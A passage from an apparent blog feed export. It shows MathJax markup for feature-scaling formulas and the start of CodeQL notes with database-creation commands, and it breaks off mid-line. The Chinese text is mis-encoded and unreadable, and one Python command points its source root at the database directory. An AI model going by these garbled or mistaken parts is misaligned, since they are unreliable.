12T400 -6T353 12T329 54V58L327 55Q325 52 322 49T314 40T302 29T287 17T269 6T247 -2T221 -8T190 -11Q130 -11 82 20T34 107Q34 128 41 147T68 188T116 225T194 253T304 268H318V290Q318 324 312 340Q290 411 215 411Q197 411 181 410T156 406T148 403Q170 388 170 359Q170 334 154 320ZM126 106Q126 75 150 51T209 26Q247 26 276 49T315 109Q317 116 318 175Q318 233 317 233Q309 233 296 232T251 223T193 203T147 166T126 106Z" transform="translate(833,0)" style="stroke-width: 3;"/><path data-c="78" d="M201 0Q189 3 102 3Q26 3 17 0H11V46H25Q48 47 67 52T96 61T121 78T139 96T160 122T180 150L226 210L168 288Q159 301 149 315T133 336T122 351T113 363T107 370T100 376T94 379T88 381T80 383Q74 383 44 385H16V431H23Q59 429 126 429Q219 429 229 431H237V385Q201 381 201 369Q201 367 211 353T239 315T268 274L272 270L297 304Q329 345 329 358Q329 364 327 369T322 376T317 380T310 384L307 385H302V431H309Q324 428 408 428Q487 428 493 431H499V385H492Q443 385 411 368Q394 360 377 341T312 257L296 236L358 151Q424 61 429 57T446 50Q464 46 499 46H516V0H510H502Q494 1 482 1T457 2T432 2T414 3Q403 3 377 3T327 1L304 0H295V46H298Q309 46 320 51T331 63Q331 65 291 120L250 175Q249 174 219 133T185 88Q181 83 181 74Q181 63 188 55T206 46Q208 46 208 23V0H201Z" transform="translate(1333,0)" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(2193.1,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msub" transform="translate(3193.4,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(605,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mtext"><path data-c="6D" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z" style="stroke-width: 3;"/><path data-c="69" d="M69 609Q69 637 87 653T131 669Q154 667 171 652T188 609Q188 579 171 564T129 549Q104 549 87 564T69 609ZM247 0Q232 3 143 3Q132 3 106 3T56 1L34 0H26V46H42Q70 46 91 49Q100 53 102 60T104 102V205V293Q104 345 102 359T88 378Q74 385 41 385H30V408Q30 431 32 431L42 432Q52 433 70 434T106 436Q123 437 142 438T171 441T182 442H185V62Q190 52 197 50T232 46H255V0H247Z" transform="translate(833,0)" style="stroke-width: 3;"/><path data-c="6E" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q450 438 463 329Q464 322 464 190V104Q464 66 466 59T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z" transform="translate(1111,0)" style="stroke-width: 3;"/></g></g></g></g><rect width="5227.1" height="60" x="120" y="220"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><msup><mi>x</mi><mo data-mjx-alternate="1">â€²</mo></msup><mo>=</mo><mfrac><mrow><mi>x</mi><mo>âˆ’</mo><msub><mi>x</mi><mrow data-mjx-texclass="ORD"><mtext>min</mtext></mrow></msub></mrow><mrow><msub><mi>x</mi><mrow data-mjx-texclass="ORD"><mtext>max</mtext></mrow></msub><mo>âˆ’</mo><msub><mi>x</mi><mrow data-mjx-texclass="ORD"><mtext>min</mtext></mrow></msub></mrow></mfrac></math></mjx-assistive-mml></mjx-container><p>é€‚ç”¨äºç‰¹å¾åˆ†å¸ƒè¾ƒä¸ºå‡åŒ€çš„æƒ…å†µã€‚</p><h3 id="æ ‡å‡†åŒ–ï¼ˆStandardizationï¼‰"><strong>æ ‡å‡†åŒ–ï¼ˆStandardizationï¼‰</strong></h3><p>å°†ç‰¹å¾è½¬ä¸ºå‡å€¼ä¸º0ã€æ ‡å‡†å·®ä¸º1çš„åˆ†å¸ƒï¼ˆZ-scoreæ ‡å‡†åŒ–ï¼‰ï¼š</p><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -1.577ex;" xmlns="http://www.w3.org/2000/svg" width="11.358ex" height="4.425ex" role="img" focusable="false" viewbox="0 -1259 5020.5 1956" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(605,413) scale(0.707)"><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(1127.2,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mfrac" transform="translate(2183,0)"><g data-mml-node="mrow" transform="translate(220,676)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(794.2,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(1794.4,0)"><path data-c="1D707" d="M58 -216Q44 -216 34 -208T23 -186Q23 -176 96 116T173 414Q186 442 219 442Q231 441 239 435T249 423T251 413Q251 401 220 279T187 142Q185 131 185 107V99Q185 26 252 26Q261 26 270 27T287 31T302 38T315 45T327 55T338 65T348 77T356 88T365 100L372 110L408 253Q444 395 448 404Q461 431 491 431Q504 431 512 424T523 412T525 402L449 84Q448 79 448 68Q448 43 455 35T476 26Q485 27 496 35Q517 55 537 131Q543 151 547 152Q549 153 557 153H561Q580 153 580 144Q580 138 575 117T555 63T523 13Q510 0 491 -8Q483 -10 467 -10Q446 -10 429 -4T402 11T385 29T376 44T374 51L368 45Q362 39 350 30T324 12T288 -4T246 -11Q199 -11 153 12L129 -85Q108 -167 104 -180T92 -202Q76 -216 58 -216Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mi" transform="translate(1133.2,-686)"><path data-c="1D70E" d="M184 -11Q116 -11 74 34T31 147Q31 247 104 333T274 430Q275 431 414 431H552Q553 430 555 429T559 427T562 425T565 422T567 420T569 416T570 412T571 407T572 401Q572 357 507 357Q500 357 490 357T476 358H416L421 348Q439 310 439 263Q439 153 359 71T184 -11ZM361 278Q361 358 276 358Q152 358 115 184Q114 180 114 178Q106 141 106 117Q106 67 131 47T188 26Q242 26 287 73Q316 103 334 153T356 233T361 278Z" style="stroke-width: 3;"/></g><rect width="2597.4" height="60" x="120" y="220"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><msup><mi>x</mi><mo data-mjx-alternate="1">â€²</mo></msup><mo>=</mo><mfrac><mrow><mi>x</mi><mo>âˆ’</mo><mi>Î¼</mi></mrow><mi>Ïƒ</mi></mfrac></math></mjx-assistive-mml></mjx-container><p>å¯¹å¼‚å¸¸å€¼ä¸æ•æ„Ÿï¼Œæ›´é€‚åˆæ­£æ€åˆ†å¸ƒçš„æ•°æ®ã€‚</p><h3 id="æœ€å¤§ç»å¯¹å€¼ç¼©æ”¾ï¼ˆMaxAbsScalerï¼‰"><strong>æœ€å¤§ç»å¯¹å€¼ç¼©æ”¾ï¼ˆMaxAbsScalerï¼‰</strong></h3><p>å°†ç‰¹å¾ç¼©æ”¾åˆ° [-1, 1] ä¹‹é—´ï¼Œä¿æŒç¨€ç–æ€§ï¼Œé€‚ç”¨äºç¨€ç–æ•°æ®é›†ã€‚</p><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -2.17ex;" xmlns="http://www.w3.org/2000/svg" width="11.651ex" height="4.699ex" role="img" focusable="false" viewbox="0 -1118 5149.9 2077" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(605,413) scale(0.707)"><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(1127.2,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mfrac" transform="translate(2183,0)"><g data-mml-node="mi" transform="translate(1197.5,676)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mrow" transform="translate(220,-709.5)"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z" style="stroke-width: 3;"/></g><g data-mml-node="msub" transform="translate(278,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(605,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="6D" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z" style="stroke-width: 3;"/><path data-c="61" d="M137 305T115 305T78 320T63 359Q63 394 97 421T218 448Q291 448 336 416T396 340Q401 326 401 309T402 194V124Q402 76 407 58T428 40Q443 40 448 56T453 109V145H493V106Q492 66 490 59Q481 29 455 12T400 -6T353 12T329 54V58L327 55Q325 52 322 49T314 40T302 29T287 17T269 6T247 -2T221 -8T190 -11Q130 -11 82 20T34 107Q34 128 41 147T68 188T116 225T194 253T304 268H318V290Q318 324 312 340Q290 411 215 411Q197 411 181 410T156 406T148 403Q170 388 170 359Q170 334 154 320ZM126 106Q126 75 150 51T209 26Q247 26 276 49T315 109Q317 116 318 175Q318 233 317 233Q309 233 296 232T251 223T193 203T147 166T126 106Z" transform="translate(833,0)" style="stroke-width: 3;"/><path data-c="78" d="M201 0Q189 3 102 3Q26 3 17 0H11V46H25Q48 47 67 52T96 61T121 78T139 96T160 122T180 150L226 210L168 288Q159 301 149 315T133 336T122 351T113 363T107 370T100 376T94 379T88 381T80 383Q74 383 44 385H16V431H23Q59 429 126 429Q219 429 229 431H237V385Q201 381 201 369Q201 367 211 353T239 315T268 274L272 270L297 304Q329 345 329 358Q329 364 327 369T322 376T317 380T310 384L307 385H302V431H309Q324 428 408 428Q487 428 493 431H499V385H492Q443 385 411 368Q394 360 377 341T312 257L296 236L358 151Q424 61 429 57T446 50Q464 46 499 46H516V0H510H502Q494 1 482 1T457 2T432 2T414 3Q403 3 377 3T327 1L304 0H295V46H298Q309 46 320 51T331 63Q331 65 291 120L250 175Q249 174 219 133T185 88Q181 83 181 74Q181 63 188 55T206 46Q208 46 208 23V0H201Z" transform="translate(1333,0)" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(2248.9,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z" style="stroke-width: 3;"/></g></g><rect width="2726.9" height="60" x="120" y="220"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><msup><mi>x</mi><mo data-mjx-alternate="1">â€²</mo></msup><mo>=</mo><mfrac><mi>x</mi><mrow><mo data-mjx-texclass="ORD" stretchy="false">|</mo><msub><mi>x</mi><mrow data-mjx-texclass="ORD"><mo data-mjx-texclass="OP" movablelimits="true">max</mo></mrow></msub><mo data-mjx-texclass="ORD" stretchy="false">|</mo></mrow></mfrac></math></mjx-assistive-mml></mjx-container><h3 id="å¯¹æ•°ç¼©æ”¾ï¼ˆLog-Scalingï¼‰"><strong>å¯¹æ•°ç¼©æ”¾ï¼ˆLog Scalingï¼‰</strong></h3><p>ç”¨äºç¼©æ”¾å³åçš„ç‰¹å¾ï¼ˆé•¿å°¾åˆ†å¸ƒï¼‰ï¼š</p><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="14.782ex" height="2.396ex" role="img" focusable="false" viewbox="0 -809 6533.5 1059" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(605,413) scale(0.707)"><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(1127.2,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(2183,0)"><path data-c="6C" d="M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z" style="stroke-width: 3;"/><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(278,0)" style="stroke-width: 3;"/><path data-c="67" d="M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z" transform="translate(778,0)" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(3461,0)"><path data-c="2061" d="" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(3461,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(3850,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(4644.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(5644.5,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(6144.5,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><msup><mi>x</mi><mo data-mjx-alternate="1">â€²</mo></msup><mo>=</mo><mi>log</mi><mo data-mjx-texclass="NONE">â¡</mo><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></math></mjx-assistive-mml></mjx-container>]]></content>
      
      
      <categories>
          
          <category> AIç›¸å…³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æœºå™¨å­¦ä¹  </tag>
            
            <tag> çº¿æ€§å›å½’ </tag>
            
            <tag> ç‰¹å¾æ”¾ç¼© </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CodeqlæŸ¥è¯¢è¯­æ³•ç¬”è®°</title>
      <link href="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="ç”Ÿæˆæ•°æ®åº“">ç”Ÿæˆæ•°æ®åº“</h2><p>ä»¥ä¸‹ä¸ºå„ç§è¯­è¨€åˆ›å»ºæ•°æ®åº“çš„å‘½ä»¤ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">java</span></span><br><span class="line">codeql database create &quot;~/CodeQL/databases/code-database&quot; --source-root=&quot;~/CodeQL/projects/java-code&quot; --language=java --command=&quot;mvn clean install -file pom.xml&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Go</span></span><br><span class="line">codeql database create &quot;~/CodeQL/databases/code-database&quot; --source-root=&quot;~/CodeQL/projects/java-code&quot; --language=go</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Python</span></span><br><span class="line">codeql database create &quot;~/CodeQL/databases/code-database&quot; --source-root=&quot;~/CodeQL/databases/code-database&quot; --language=python</span><br><span class="line"><span class="meta prompt_"># </span><span 